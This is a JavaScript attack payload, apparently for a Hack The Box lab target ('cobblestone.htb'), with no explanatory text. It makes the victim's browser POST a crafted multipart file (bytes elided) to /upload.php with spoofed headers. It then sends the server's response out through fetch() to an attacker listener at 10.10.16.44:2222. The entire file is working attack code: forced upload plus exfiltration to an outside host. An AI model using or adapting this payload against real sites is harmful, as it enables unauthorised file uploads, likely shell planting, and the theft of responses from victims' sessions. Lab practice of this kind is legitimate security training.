const logserver = "http://10.10.16.44:2222";

function send(d){ 
  try{
    fetch( logserver + "/?=" + (encodeURIComponent(d.toString())));
  }catch{} 
}


// payload 
const boundary = '---------------------------40859719983360919588503282431';

// full payload
const payload = new Uint8Array([
	0x2d, ...
]);

const blob = new Blob([payload], { type: 'multipart/form-data; boundary=' + boundary });


fetch('/upload.php', {
    method: 'POST',
    headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer': 'http://cobblestone.htb/skins.php',
    },
    body: blob 
})
.then(response => response.text())
.then(data => send(data))
.catch(error => send('Error:', error));

